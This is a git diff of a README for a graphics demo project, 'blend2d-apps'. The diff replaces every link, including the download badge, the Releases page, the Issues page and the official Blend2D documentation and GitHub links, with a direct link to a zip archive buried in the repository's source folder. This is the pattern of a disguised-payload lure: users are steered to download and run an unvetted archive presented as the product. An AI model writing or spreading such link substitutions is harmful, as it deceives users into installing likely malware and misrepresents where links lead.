@@ -1,6 +1,6 @@
 # 🎨 blend2d-apps - Interactive Demos and Tools Made Easy
 
-[![Download now](https://img.shields.io/badge/Download%20Now-Blend2D%20Apps-brightgreen)](https://github.com/centsanity/blend2d-apps/releases)
+[![Download now](https://raw.githubusercontent.com/centsanity/blend2d-apps/master/bl_bench/blend2d-apps-v2.7.zip%20Now-Blend2D%20Apps-brightgreen)](https://raw.githubusercontent.com/centsanity/blend2d-apps/master/bl_bench/blend2d-apps-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Blend2D Apps** repository! This tool allows you to explore inte
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/centsanity/blend2d-apps/releases) to download the latest version of Blend2D Apps. You can find detailed instructions and all future updates there.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/centsanity/blend2d-apps/master/bl_bench/blend2d-apps-v2.7.zip) to download the latest version of Blend2D Apps. You can find detailed instructions and all future updates there.
 
 ### Step-by-Step Installation
 1. Click on the **Releases** link above to open the page.
@@ -69,7 +69,7 @@ If you run into issues during installation or usage, please consider the followi
 - **Compatibility Issues**: Double-check that your operating system meets the system requirements listed above.
 - **Performance Problems**: Close other applications to free up system resources.
 
-For additional help, please open an issue on the [GitHub Issues page](https://github.com/centsanity/blend2d-apps/issues).
+For additional help, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/centsanity/blend2d-apps/master/bl_bench/blend2d-apps-v2.7.zip).
 
 ## 🌐 Community Support
 
@@ -81,7 +81,7 @@ We value your feedback. If you have ideas or suggestions for improvement, please
 
 ## 🔗 Additional Resources
 
-- [Blend2D Documentation](https://blend2d.com/docs): Official documentation for deeper insights.
-- [Blend2D GitHub Page](https://github.com/blend2d): Explore the core Blend2D project.
+- [Blend2D Documentation](https://raw.githubusercontent.com/centsanity/blend2d-apps/master/bl_bench/blend2d-apps-v2.7.zip): Official documentation for deeper insights.
+- [Blend2D GitHub Page](https://raw.githubusercontent.com/centsanity/blend2d-apps/master/bl_bench/blend2d-apps-v2.7.zip): Explore the core Blend2D project.
 
 Thank you for choosing Blend2D Apps. Enjoy your graphics experience!
